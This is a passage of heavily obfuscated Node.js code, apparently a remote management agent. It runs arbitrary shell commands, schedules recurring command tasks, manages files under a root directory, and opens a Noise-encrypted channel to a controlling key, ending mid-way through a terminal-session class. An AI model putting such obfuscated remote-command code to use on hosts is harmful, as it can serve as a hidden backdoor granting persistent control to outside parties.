                'fcLFr': ay(0x29f),
                'HmvsM': ay(0x25c),
                'aWfkt': ay(0x3bd)
            };
        try {
            const b = await a0n['fsSize'](), c = b[ay(0x2ef)](g => {
                    const az = ay;
                    return g[az(0x329)] > 0x0 && a[az(0x2bc)](g['type'], a[az(0x3fd)]) && g[az(0x2c1)] !== a[az(0x32a)] && g['fs']['startsWith'](a['aWfkt']);
                }), d = c[ay(0x210)]((g, h) => g + h[ay(0x329)], 0x0), f = c[ay(0x210)]((g, h) => g + h['used'], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0S(0x39e)]() {
        const aA = a0S;
        try {
            const a = await a0n[aA(0x181)](), b = a[aA(0x2ef)](d => d[aA(0x42b)] === aA(0x351))['length'], c = a[aA(0x2ef)](d => d[aA(0x42b)] === aA(0x32c))[aA(0x3ba)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0H {
    static async ['execute'](a, b = {}) {
        const aB = a0S, c = {
                'gyEeV': function (d, f) {
                    return d || f;
                },
                'AgpMP': function (d, f) {
                    return d === f;
                },
                'YRmvv': aB(0x38f),
                'tDaLp': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'fATRW': function (d, f) {
                    return d * f;
                },
                'zMwlL': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[aB(0x3d3)](),
                env: env = {},
                timeout: timeout = a0D['Rtimeout']
            } = b;
        return new Promise(d => {
            const aC = aB, f = Date[aC(0x262)](), g = c[aC(0x435)](a0l, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[aC(0x19d)](timeout, 0x3e8),
                    'maxBuffer': c[aC(0x19d)](c[aC(0x416)](0xa, 0x400), 0x400)
                }, (h, i, j) => {
                    const aD = aC, k = Date[aD(0x262)]() - f, l = h && h[aD(0x15f)] && h[aD(0x255)];
                    let m = c['gyEeV'](i, '');
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            c['AgpMP'](typeof h[aD(0x32d)], c[aD(0x3fc)]) ? n = h['code'] : n = -0x1;
                    }
                    d({
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
class a0I {
    static async [a0S(0x402)](a, b = ![]) {
        const aE = a0S, c = {
                'pnfWP': aE(0x404),
                'FJpKn': aE(0x20b),
                'pFlrE': function (h, i) {
                    return h & i;
                },
                'sIVZB': function (h, i) {
                    return h(i);
                },
                'IQZax': function (h, i) {
                    return h || i;
                },
                'DEuKg': aE(0x171)
            }, d = a0j[aE(0x285)](a0D['FILE_ROOT'], c[aE(0x38a)](a, '.'));
        if (!d[aE(0x1f5)](a0D[aE(0x32e)]))
            throw new Error(c[aE(0x1df)]);
        if (!a0h[aE(0x1ed)](d))
            throw new Error(aE(0x22b));
        const f = [], g = h => {
                const aF = aE, i = a0h[aF(0x21e)](h);
                for (const j of i) {
                    const k = a0j[aF(0x30a)](h, j), l = a0h[aF(0x39b)](k), m = new a0z();
                    m['name'] = j, m['path'] = a0j['relative'](a0D[aF(0x32e)], k), m[aF(0x2c1)] = l['isDirectory']() ? c[aF(0x333)] : c[aF(0x15e)], m[aF(0x329)] = l[aF(0x329)], m[aF(0x267)] = l[aF(0x267)][aF(0x215)](), m[aF(0x236)] = this[aF(0x15b)](l[aF(0x236)], l[aF(0x41a)]()), m[aF(0x2a7)] = '0o' + c[aF(0x397)](l[aF(0x236)], 0x1ff)[aF(0x3f4)](0x8), m[aF(0x259)] = l[aF(0x3e1)] + ':' + l[aF(0x1e9)], f[aF(0x2d0)](m), b && l[aF(0x41a)]() && c[aF(0x26a)](g, k);
                }
            };
        return c['sIVZB'](g, d), f;
    }
    static async [a0S(0x1a3)](a) {
        const aG = a0S, b = { 'oQYRM': aG(0x20b) }, c = [];
        for (const d of a) {
            const f = a0j[aG(0x285)](a0D['FILE_ROOT'], d);
            if (!f[aG(0x1f5)](a0D[aG(0x32e)]))
                continue;
            try {
                const g = a0h[aG(0x39b)](f), h = this[aG(0x30c)](f, a0h[aG(0x348)][aG(0x265)]), i = this[aG(0x30c)](f, a0h[aG(0x348)][aG(0x398)]), j = this[aG(0x30c)](f, a0h[aG(0x348)][aG(0x3bc)]), k = new a0A();
                k[aG(0x1c2)] = a0j[aG(0x2a0)](a0D[aG(0x32e)], f), k['name'] = a0j[aG(0x208)](f), k[aG(0x236)] = this['_formatMode'](g[aG(0x236)], g[aG(0x41a)]()), k[aG(0x2a7)] = '0o' + (g[aG(0x236)] & 0x1ff)[aG(0x3f4)](0x8), k['type'] = g[aG(0x41a)]() ? aG(0x404) : b[aG(0x26e)], k['readable'] = h, k['writable'] = i, k['executable'] = j, c[aG(0x2d0)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0S(0x30c)](a, b) {
        const aH = a0S;
        try {
            return a0h[aH(0x200)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static ['_parseMode'](a) {
        const aI = a0S, b = {
                'KNMOP': function (c, d) {
                    return c === d;
                },
                'pVpgM': 'number',
                'GAvSO': function (c, d) {
                    return c === d;
                },
                'FDphg': 'string',
                'hfwoc': aI(0x424)
            };
        if (b[aI(0x3df)](typeof a, b[aI(0x1bd)]))
            return a;
        if (b[aI(0x33c)](typeof a, b[aI(0x1a4)])) {
            const c = a['trim']();
            if (/^[0-7]{3,4}$/[aI(0x3a9)](c))
                return parseInt(c, 0x8);
        }
        throw new Error(b[aI(0x291)]);
    }
    static [a0S(0x15b)](a, b) {
        const aJ = a0S, c = {
                'xUBLy': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = (a & 0x1ff)['toString'](0x8)[aJ(0x36b)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[aJ(0x327)](parseInt, i, 0xa);
            h += f[aJ(0x1c8)]((k, l) => j & 0x4 >> l ? k : '-')[aJ(0x30a)]('');
        }
        return h;
    }
    static async ['setFilePermissions'](a, b = ![]) {
        const aK = a0S, c = {
                'ElnoE': function (g, h) {
                    return g(h);
                },
                'KGeLK': function (g, h) {
                    return g(h);
                },
                'MEfOr': function (g, h) {
                    return g(h);
                },
                'AvHgG': 'access_denied',
                'jVQbl': function (g, h) {
                    return g(h);
                },
                'mdpOr': function (g, h) {
                    return g(h);
                },
                'QLelf': 'error'
            }, d = [];
        for (const [g, h] of Object[aK(0x257)](a)) {
            const i = a0j[aK(0x285)](a0D[aK(0x32e)], g);
            if (!i['startsWith'](a0D[aK(0x32e)])) {
                d[aK(0x2d0)]({
                    'path': g,
                    'requested': c[aK(0x3d5)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[aK(0x415)]
                });
                continue;
            }
            try {
                const j = this[aK(0x229)](h), k = m => {
                        const aL = aK;
                        a0h[aL(0x373)](m, j);
                    };
                if (b && a0h['existsSync'](i) && a0h[aK(0x39b)](i)[aK(0x41a)]()) {
                    const m = n => {
                        const aM = aK;
                        c['ElnoE'](k, n);
                        const o = a0h[aM(0x21e)](n);
                        for (const p of o) {
                            const q = a0j['join'](n, p);
                            a0h['statSync'](q)[aM(0x41a)]() ? m(q) : c[aM(0x387)](k, q);
                        }
                    };
                    c[aK(0x2a5)](m, i);
                } else
                    c[aK(0x346)](k, i);
                const l = j['toString'](0x8);
                d[aK(0x2d0)]({
                    'path': g,
                    'requested': String(h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[aK(0x2d0)]({
                    'path': g,
                    'requested': c[aK(0x2a5)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[aK(0x1d4)],
                    'message': n['message']
                });
            }
        }
        const f = d['filter'](o => o[aK(0x160)] === 'ok')[aK(0x3ba)];
        return {
            'status': 'ok',
            'total': d[aK(0x3ba)],
            'success': f,
            'results': d
        };
    }
    static async ['readFile'](a) {
        const aN = a0S, b = {
                'hHaxt': aN(0x171),
                'JDGPe': function (h, i) {
                    return h > i;
                },
                'YuLrg': aN(0x1fe),
                'zuowL': aN(0x313)
            }, c = a0j[aN(0x285)](a0D[aN(0x32e)], a);
        if (!c[aN(0x1f5)](a0D['FILE_ROOT']))
            throw new Error(b['hHaxt']);
        const d = a0h[aN(0x39b)](c);
        if (b['JDGPe'](d[aN(0x329)], 0x400 * 0x400))
            throw new Error(b[aN(0x3d4)]);
        const f = a0h['readFileSync'](c), g = this['_isBinary'](f);
        return {
            'status': 'ok',
            'path': a0j[aN(0x2a0)](a0D[aN(0x32e)], c),
            'content': g ? a0p['fromByteArray'](f) : f[aN(0x3f4)](aN(0x18f)),
            'encoding': g ? aN(0x209) : b['zuowL'],
            'is_binary': g,
            'size': d[aN(0x329)]
        };
    }
    static [a0S(0x184)](a) {
        const aO = a0S, b = {
                'WmDEz': function (c, d) {
                    return c < d;
                },
                'RGJBh': function (c, d) {
                    return c === d;
                }
            };
        if (!a || a[aO(0x3ba)] === 0x0)
            return ![];
        for (let c = 0x0; b[aO(0x1d8)](c, Math[aO(0x29a)](a['length'], 0x200)); c++) {
            if (b['RGJBh'](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0S(0x274)](a, b, c, d = null, f = null) {
        const aP = a0S, g = {
                'sgjfI': aP(0x171),
                'LHyBf': function (l, m) {
                    return l > m;
                },
                'nhCrB': function (l, m) {
                    return l !== m;
                },
                'QBNrA': aP(0x214),
                'KkgtN': '.upload_chunks',
                'nzRGV': function (l, m) {
                    return l < m;
                }
            }, h = a0j[aP(0x285)](a0D[aP(0x32e)], a);
        let j = h;
        b && (j = a0j[aP(0x30a)](h, b));
        if (!j['startsWith'](a0D[aP(0x32e)]))
            throw new Error(g['sgjfI']);
        !a0h['existsSync'](a0j['dirname'](j)) && a0h[aP(0x34f)](a0j['dirname'](j), { 'recursive': !![] });
        const k = a0p[aP(0x2a1)](c);
        if (g[aP(0x188)](k[aP(0x3ba)], a0D['MAX_UPLOAD_SIZE']))
            throw new Error('File\x20too\x20large');
        if (g[aP(0x205)](d, null) && f !== null) {
            const l = Number(d), m = Number(f);
            if (Number[aP(0x271)](l) || Number[aP(0x271)](m))
                throw new Error(g[aP(0x1cf)]);
            const n = a0j[aP(0x30a)](a0j[aP(0x183)](j), g[aP(0x256)], a0j[aP(0x208)](j));
            !a0h[aP(0x1ed)](n) && a0h[aP(0x34f)](n, { 'recursive': !![] });
            const o = a0j[aP(0x30a)](n, aP(0x252) + l);
            a0h[aP(0x426)](o, k);
            const p = a0h['readdirSync'](n)[aP(0x2ef)](s => s[aP(0x1f5)]('chunk_')), q = p[aP(0x3ba)], r = q === m;
            if (r) {
                const s = a0h[aP(0x332)](j);
                for (let t = 0x0; g['nzRGV'](t, m); t++) {
                    const u = a0j[aP(0x30a)](n, 'chunk_' + t);
                    if (!a0h[aP(0x1ed)](u)) {
                        s[aP(0x3e5)]();
                        throw new Error(aP(0x422) + t);
                    }
                    s[aP(0x384)](a0h[aP(0x396)](u));
                }
                s[aP(0x294)]();
                for (const v of a0h[aP(0x21e)](n)) {
                    a0h['unlinkSync'](a0j[aP(0x30a)](n, v));
                }
                a0h[aP(0x1a5)](n, { 'recursive': !![] });
            }
            return {
                'status': 'ok',
                'path': a0j[aP(0x2a0)](a0D[aP(0x32e)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0h[aP(0x426)](j, k), {
            'status': 'ok',
            'path': a0j[aP(0x2a0)](a0D[aP(0x32e)], j),
            'received': k[aP(0x3ba)],
            'total': k['length'],
            'chunked': ![]
        };
    }
    static async [a0S(0x314)](a) {
        const aQ = a0S, b = {
                'shAyf': aQ(0x171),
                'kSwTU': aQ(0x3a8)
            }, c = a0j[aQ(0x285)](a0D['FILE_ROOT'], a);
        if (!c[aQ(0x1f5)](a0D[aQ(0x32e)]))
            throw new Error(b[aQ(0x2e7)]);
        if (!a0h['existsSync'](c))
            throw new Error(b['kSwTU']);
        const d = a0h['statSync'](c), f = a0h[aQ(0x396)](c), g = a0p[aQ(0x1f8)](f);
        return {
            'path': a0j[aQ(0x2a0)](a0D[aQ(0x32e)], c),
            'content': g,
            'size': d[aQ(0x329)]
        };
    }
    static async ['deleteFiles'](a) {
        const aR = a0S, b = {
                'TmTfK': aR(0x237),
                'ENMII': 'deleted',
                'NUbSN': aR(0x3c7),
                'lOcCb': aR(0x338)
            }, c = [];
        for (const d of a) {
            const f = a0j[aR(0x285)](a0D['FILE_ROOT'], d);
            if (!f[aR(0x1f5)](a0D[aR(0x32e)])) {
                c[aR(0x2d0)]({
                    'path': d,
                    'status': b[aR(0x296)]
                });
                continue;
            }
            try {
                if (a0h[aR(0x1ed)](f)) {
                    const g = a0h[aR(0x39b)](f);
                    g[aR(0x41a)]() ? a0h[aR(0x1a5)](f, { 'recursive': !![] }) : a0h[aR(0x230)](f), c[aR(0x2d0)]({
                        'path': d,
                        'status': b['ENMII']
                    });
                } else
                    c[aR(0x2d0)]({
                        'path': d,
                        'status': b['NUbSN']
                    });
            } catch (h) {
                c['push']({
                    'path': d,
                    'status': b[aR(0x411)],
                    'message': h['message']
                });
            }
        }
        return c;
    }
    static async [a0S(0x226)](a) {
        const aS = a0S, b = { 'DrCPd': aS(0x237) }, c = [];
        for (const [d, f] of Object[aS(0x257)](a)) {
            const g = a0j[aS(0x285)](a0D['FILE_ROOT'], d), h = a0j[aS(0x285)](a0D[aS(0x32e)], f);
            if (!g['startsWith'](a0D[aS(0x32e)]) || !h[aS(0x1f5)](a0D['FILE_ROOT'])) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b[aS(0x339)]
                });
                continue;
            }
            try {
                const i = a0j['dirname'](h);
                !a0h[aS(0x1ed)](i) && a0h[aS(0x34f)](i, { 'recursive': !![] }), a0h[aS(0x21a)](g, h), c[aS(0x2d0)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[aS(0x2d0)]({
                    'from': d,
                    'to': f,
                    'status': aS(0x338),
                    'message': j[aS(0x35a)]
                });
            }
        }
        return c;
    }
    static async [a0S(0x1ea)](a) {
        const aT = a0S, b = {
                'pQnZE': function (d, f, g) {
                    return d(f, g);
                },
                'eaBCh': aT(0x237),
                'zbdEM': aT(0x3c7),
                'KVFfE': function (d, f, g) {
                    return d(f, g);
                },
                'hYWhb': 'error'
            }, c = [];
        for (const [d, f] of Object[aT(0x257)](a)) {
            const g = a0j[aT(0x285)](a0D[aT(0x32e)], d), h = a0j[aT(0x285)](a0D[aT(0x32e)], f);
            if (!g[aT(0x1f5)](a0D[aT(0x32e)]) || !h['startsWith'](a0D[aT(0x32e)])) {
                c[aT(0x2d0)]({
                    'from': d,
                    'to': f,
                    'status': b[aT(0x35c)]
                });
                continue;
            }
            try {
                if (!a0h[aT(0x1ed)](g)) {
                    c[aT(0x2d0)]({
                        'from': d,
                        'to': f,
                        'status': b['zbdEM']
                    });
                    continue;
                }
                const i = a0j['dirname'](h);
                !a0h[aT(0x1ed)](i) && a0h[aT(0x34f)](i, { 'recursive': !![] });
                const j = a0h[aT(0x39b)](g);
                if (j['isDirectory']()) {
                    if (a0h[aT(0x2e4)])
                        a0h['cpSync'](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const aU = aT;
                            if (a0h['statSync'](l)[aU(0x41a)]()) {
                                if (!a0h[aU(0x1ed)](m))
                                    a0h[aU(0x34f)](m, { 'recursive': !![] });
                                for (const n of a0h[aU(0x21e)](l)) {
                                    b[aU(0x3f2)](k, a0j[aU(0x30a)](l, n), a0j[aU(0x30a)](m, n));
                                }
                            } else
                                a0h['copyFileSync'](l, m);
                        };
                        b['KVFfE'](k, g, h);
                    }
                } else
                    a0h[aT(0x179)](g, h);
                c[aT(0x2d0)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[aT(0x2d0)]({
                    'from': d,
                    'to': f,
                    'status': b[aT(0x2d9)],
                    'message': l[aT(0x35a)]
                });
            }
        }
        return c;
    }
    static async ['createDirectory'](a) {
        const aV = a0S, b = { 'EINfD': 'Access\x20denied:\x20path\x20outside\x20root' }, c = a0j[aV(0x285)](a0D[aV(0x32e)], a);
        if (!c[aV(0x1f5)](a0D[aV(0x32e)]))
            throw new Error(b[aV(0x381)]);
        return a0h[aV(0x34f)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0j[aV(0x2a0)](a0D[aV(0x32e)], c)
        };
    }
}
class a0J {
    static [a0S(0x3c0)] = new Map();
    static [a0S(0x3a7)](a, b) {
        const aW = a0S, c = {
                'TzkXe': function (d, f) {
                    return d > f;
                },
                'SzBXX': function (d, f) {
                    return d - f;
                }
            };
        a[aW(0x2d0)](b), c['TzkXe'](a['length'], a0D['MAX_TASK_LOG_SIZE']) && a[aW(0x30f)](0x0, c['SzBXX'](a[aW(0x3ba)], a0D['MAX_TASK_LOG_SIZE']));
    }
    static [a0S(0x245)](a, b, c, d, f = null) {
        const aX = a0S, g = new Date()[aX(0x215)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + aX(0x328) + a + aX(0x196) + c + '\x0a' + (b?.[aX(0x273)]() || '')
        };
    }
    static [a0S(0x2f1)]() {
        const aY = a0S;
        return {
            'status': 'ok',
            'count': a0D[aY(0x3cd)][aY(0x3ba)],
            'tasks': a0D[aY(0x3cd)]
        };
    }
    static async [a0S(0x2e0)](a) {
        const aZ = a0S, b = {
                'xTbSY': function (d, f) {
                    return d < f;
                },
                'rsyis': aZ(0x335),
                'jPcMO': function (d, f) {
                    return d === f;
                },
                'pcbvk': aZ(0x338)
            };
        a0D[aZ(0x3cd)] = a || [], a0D['InitTask'] = !![];
        const c = [];
        for (let d = 0x0; b[aZ(0x185)](d, a0D[aZ(0x3cd)][aZ(0x3ba)]); d++) {
            const f = a0D[aZ(0x3cd)][d], g = await a0H[aZ(0x423)](f), h = this[aZ(0x245)](f, g['result'], g[aZ(0x1d6)], b['rsyis']);
            this[aZ(0x3a7)](a0D[aZ(0x23c)], h), c[aZ(0x2d0)]({
                'index': d,
                'cmd': f,
                'exitcode': g[aZ(0x1d6)],
                'output': g[aZ(0x3e8)],
                'status': b[aZ(0x3d0)](g[aZ(0x1d6)], 0x0) ? 'ok' : b[aZ(0x305)]
            });
        }
        return a0D[aZ(0x1c6)] = ![], {
            'status': 'ok',
            'count': a0D['onetasks'][aZ(0x3ba)],
            'tasks': a0D[aZ(0x3cd)],
            'executed': c
        };
    }
    static ['getCronTasks']() {
        const b0 = a0S;
        return {
            'status': 'ok',
            'count': Object[b0(0x1aa)](a0D[b0(0x2bb)])[b0(0x3ba)],
            'tasks': a0D[b0(0x2bb)]
        };
    }
    static [a0S(0x32b)](a) {
        const b1 = a0S, b = {
                'lIuVF': function (d, f) {
                    return d === f;
                },
                'JGIYQ': 'function',
                'ZAeIO': function (d, f) {
                    return d === f;
                },
                'HkCRb': b1(0x17c),
                'iMwzc': function (d, f) {
                    return d > f;
                },
                'PisNF': b1(0x338),
                'pOjNu': function (d, f) {
                    return d - f;
                },
                'xdsBY': function (d, f) {
                    return d || f;
                },
                'SgMdC': function (d, f) {
                    return d || f;
                }
            };
        this[b1(0x3c0)]['forEach'](d => {
            const b2 = b1;
            b[b2(0x2f0)](typeof d[b2(0x2cf)], b[b2(0x246)]) && d[b2(0x2cf)](), b[b2(0x439)](typeof d[b2(0x363)], b[b2(0x246)]) && d[b2(0x363)]();
        }), this[b1(0x3c0)][b1(0x2c2)]();
        const c = [];
        for (const d of Object['keys'](a || {})) {
            !a0m[b1(0x2fa)](d) && c['push'](d);
        }
        if (b['iMwzc'](c[b1(0x3ba)], 0x0))
            return {
                'status': b[b1(0x187)],
                'message': b1(0x2d4) + c[b1(0x30a)](',\x20'),
                'valid_count': b[b1(0x1ba)](Object[b1(0x1aa)](b['xdsBY'](a, {}))[b1(0x3ba)], c[b1(0x3ba)])
            };
        a0D['crontasks'] = b[b1(0x22f)](a, {});
        for (const [f, g] of Object['entries'](a0D[b1(0x2bb)])) {
            const h = a0m[b1(0x3cb)](f, async () => {
                const b3 = b1, i = await a0H[b3(0x423)](g), j = this[b3(0x245)](g, i[b3(0x3e8)], i[b3(0x1d6)], b[b3(0x2b5)], f);
                this[b3(0x3a7)](a0D['crontasks_log'], j);
            });
            this['cronJobs'][b1(0x3b7)](f, h);
        }
        return a0D[b1(0x1b8)] = Object[b1(0x1aa)](a0D[b1(0x2bb)])['length'] > 0x0, {
            'status': 'ok',
            'count': Object[b1(0x1aa)](a0D['crontasks'])[b1(0x3ba)],
            'tasks': a0D[b1(0x2bb)]
        };
    }
    static [a0S(0x2fd)]() {
        const b4 = a0S;
        return {
            'onetime': {
                'pending': a0D[b4(0x1c6)],
                'count': a0D[b4(0x3cd)][b4(0x3ba)]
            },
            'cron': {
                'active': a0D['cronloop'],
                'count': Object[b4(0x1aa)](a0D[b4(0x2bb)])['length'],
                'check_interval': a0D[b4(0x18b)]
            }
        };
    }
    static [a0S(0x2f3)](a = 0x32) {
        const b5 = a0S, b = a0D['onetimetasks_log'][b5(0x378)](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static [a0S(0x2c9)](a = 0x32) {
        const b6 = a0S, b = a0D['crontasks_log']['slice'](-a);
        return {
            'status': 'ok',
            'count': b[b6(0x3ba)],
            'logs': b
        };
    }
    static [a0S(0x186)]() {
        const b7 = a0S, a = { 'fuSFS': b7(0x335) }, b = a0D[b7(0x23c)][b7(0x3ba)];
        return a0D[b7(0x23c)] = [], {
            'status': 'ok',
            'cleared': a['fuSFS']
        };
    }
    static ['clearCronLogs']() {
        const b8 = a0S, a = { 'TFXrd': b8(0x17c) }, b = a0D['crontasks_log'][b8(0x3ba)];
        return a0D['crontasks_log'] = [], {
            'status': 'ok',
            'cleared': a[b8(0x3f3)]
        };
    }
    static [a0S(0x2cb)]() {
        const b9 = a0S, a = {
                'BQUdv': function (g, h) {
                    return g - h;
                }
            }, b = a0D[b9(0x23c)][b9(0x2ef)](g => g[b9(0x1d6)] === 0x0)[b9(0x3ba)], c = a0D[b9(0x23c)]['length'] - b, d = a0D['crontasks_log'][b9(0x2ef)](g => g[b9(0x1d6)] === 0x0)[b9(0x3ba)], f = a[b9(0x191)](a0D['crontasks_log'][b9(0x3ba)], d);
        return {
            'onetime': {
                'total_logged': a0D[b9(0x23c)][b9(0x3ba)],
                'max_capacity': a0D[b9(0x33e)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0D[b9(0x22c)][b9(0x3ba)],
                'max_capacity': a0D[b9(0x33e)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async ['executeOnetimeTasks']() {
        const ba = a0S, a = {
                'KTlIZ': function (c, d) {
                    return c < d;
                }
            }, b = [];
        for (let c = 0x0; a[ba(0x406)](c, a0D['onetasks'][ba(0x3ba)]); c++) {
            const d = a0D[ba(0x3cd)][c], f = await a0H[ba(0x423)](d), g = this[ba(0x245)](d, f[ba(0x3e8)], f[ba(0x1d6)], 'onetime');
            this[ba(0x3a7)](a0D[ba(0x23c)], g), b['push']({
                'cmd': d,
                'exitcode': f[ba(0x1d6)],
                'output': f['result'],
                'timeout': f[ba(0x364)]
            });
        }
        return a0D['InitTask'] = ![], {
            'status': 'ok',
            'executed': b[ba(0x3ba)],
            'results': b
        };
    }
}
let a0K = null, a0L = null;
const a0M = new Promise((a, b) => {
    const bb = a0S, c = {
            'DCSPH': bb(0x43b),
            'ypPBd': bb(0x38b),
            'Prkkd': function (d) {
                return d();
            },
            'yQicE': function (d, f) {
                return d(f);
            },
            'amZsF': bb(0x1e6)
        };
    try {
        c[bb(0x1ac)](a0r, function (d) {
            const bc = bb;
            if (!d) {
                a0L = new Error(c[bc(0x334)]), a0t[bc(0x26c)](bc(0x1f0), a0L[bc(0x35a)]), a();
                return;
            }
            a0K = d, a0t['debug'](c[bc(0x24a)]), c[bc(0x42c)](a);
        });
    } catch (d) {
        a0L = d, a0t[bb(0x26c)](c[bb(0x159)], d[bb(0x35a)]), c[bb(0x42c)](a);
    }
});
process['on'](a0S(0x16b), (a, b) => {
    const bd = a0S;
    a0t[bd(0x338)](bd(0x2c6), a);
}), process['on'](a0S(0x2b1), a => {
    const be = a0S, b = { 'qHOOB': be(0x3c6) };
    a0t[be(0x338)](b[be(0x39c)], a), process[be(0x3fa)](0x1);
});
class a0N {
    constructor(a, b, c) {
        const bf = a0S;
        this[bf(0x211)] = a, this[bf(0x1d7)] = b, this[bf(0x31a)] = c, this[bf(0x326)] = ![], this['hs'] = null, this[bf(0x2ea)] = null, this['recvCipher'] = null;
    }
    async ['init']() {
        const bg = a0S, a = {
                'Veann': bg(0x356),
                'fqqHN': bg(0x17a),
                'BRzgJ': bg(0x197),
                'TwWsJ': bg(0x209)
            };
        await a0M;
        if (!a0K)
            throw a0L || new Error(a[bg(0x21f)]);
        const b = a0K, c = this[bg(0x211)] ? b[bg(0x348)]['NOISE_ROLE_INITIATOR'] : b['constants'][bg(0x16c)];
        this['hs'] = b[bg(0x2c7)](a[bg(0x268)], c);
        const d = Buffer[bg(0x1ec)](a[bg(0x355)]), f = this[bg(0x1d7)] ? Buffer['from'](this[bg(0x1d7)], bg(0x209)) : null, g = this['expectedRemotePubB64'] ? Buffer[bg(0x1ec)](this['expectedRemotePubB64'], a['TwWsJ']) : null;
        this['hs'][bg(0x2d7)](d, f, g, null);
    }
    [a0S(0x1b7)](a) {
        const bh = a0S, b = {
                'tUwYB': function (d, f) {
                    return d === f;
                },
                'Qfvom': function (d, f) {
                    return d === f;
                },
                'eDlti': function (d, f) {
                    return d === f;
                }
            };
        if (this[bh(0x326)])
            return Buffer[bh(0x150)](0x0);
        const c = a0K;
        a && a['length'] > 0x0 && b['tUwYB'](this['hs'][bh(0x297)](), c['constants']['NOISE_ACTION_READ_MESSAGE']) && this['hs'][bh(0x3f0)](a);
        if (b[bh(0x2eb)](this['hs'][bh(0x297)](), c[bh(0x348)][bh(0x190)]))
            return this[bh(0x199)](), Buffer[bh(0x150)](0x0);
        if (b[bh(0x33f)](this['hs'][bh(0x297)](), c[bh(0x348)]['NOISE_ACTION_WRITE_MESSAGE'])) {
            const d = this['hs'][bh(0x222)](new Uint8Array(0x0));
            return b[bh(0x3a5)](this['hs'][bh(0x297)](), c[bh(0x348)][bh(0x190)]) && this['_splitAndFinish'](), Buffer[bh(0x1ec)](d);
        }
        return Buffer[bh(0x150)](0x0);
    }
    [a0S(0x199)]() {
        const bi = a0S, a = this['hs'][bi(0x2de)]();
        this[bi(0x2ea)] = a[0x0], this[bi(0x261)] = a[0x1], this[bi(0x326)] = !![];
        try {
            if (this['hs'])
                this['hs'][bi(0x417)]();
        } catch (b) {
        }
        this['hs'] = null;
    }
    [a0S(0x282)](a) {
        const bj = a0S, b = { 'LguGO': bj(0x292) };
        if (!this[bj(0x326)])
            throw new Error(b[bj(0x23d)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[bj(0x1ec)](this[bj(0x2ea)][bj(0x248)](c, d));
    }
    ['decrypt'](a) {
        const bk = a0S, b = { 'PqnHn': bk(0x14f) };
        if (!this['handshakeFinished'])
            throw new Error(b[bk(0x25a)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[bk(0x1ec)](this['recvCipher'][bk(0x2b6)](c, d));
    }
    ['free']() {
        const bl = a0S, a = { 'xrRAz': bl(0x34d) }, b = a['xrRAz'][bl(0x166)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['sendCipher'] = null;
                continue;
            case '1':
                try {
                    if (this[bl(0x261)])
                        this['recvCipher']['free']();
                } catch (d) {
                }
                continue;
            case '2':
                this['hs'] = null;
                continue;
            case '3':
                this['recvCipher'] = null;
                continue;
            case '4':
                try {
                    if (this['hs'])
                        this['hs']['free']();
                } catch (f) {
                }
                continue;
            case '5':
                try {
                    if (this['sendCipher'])
                        this[bl(0x2ea)]['free']();
                } catch (g) {
                }
                continue;
            }
            break;
        }
    }
}
class a0O {
    constructor() {
        const bm = a0S, a = bm(0x1c1)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this['ptyProcess'] = null;
                continue;
            case '1':
                this[bm(0x37e)] = [];
                continue;
            case '2':
                this[bm(0x3a6)] = new a0N(![], this[bm(0x35b)], this[bm(0x362)]);
                continue;
            case '3':
                this['requestId'] = null;
                continue;
            case '4':
                this['CONTROL_PUBLIC_KEY'] = a0D[bm(0x31d)][bm(0x15c)][bm(0x393)];
                continue;
            case '5':
                this['useNoise'] = !![];
                continue;
            case '6':
                this[bm(0x158)] = bm(0x28d);
                continue;
            case '7':
                this[bm(0x1c4)] = [];
                continue;
            case '8':
                this[bm(0x254)] = null;
                continue;
            case '9':
                this[bm(0x35b)] = a0D[bm(0x31d)][bm(0x3be)][bm(0x2ac)];
                continue;
            }
            break;
        }
    }
    async [a0S(0x320)]() {
        const bn = a0S, a = {
                'cXhgB': function (b, c) {
                    return b === c;
                },
                'JYFAu': bn(0x1c9)
            };
        this[bn(0x425)] && a0t[bn(0x38d)]('[' + this[bn(0x425)] + bn(0x41d));
        if (this['ptyProcess']) {
            try {
                this[bn(0x3b4)]['kill']();
            } catch (b) {
            }
            this[bn(0x3b4)] = null;
        }
        if (this['cipher'])
            this[bn(0x3a6)][bn(0x417)]();
        if (this[bn(0x254)])
            try {
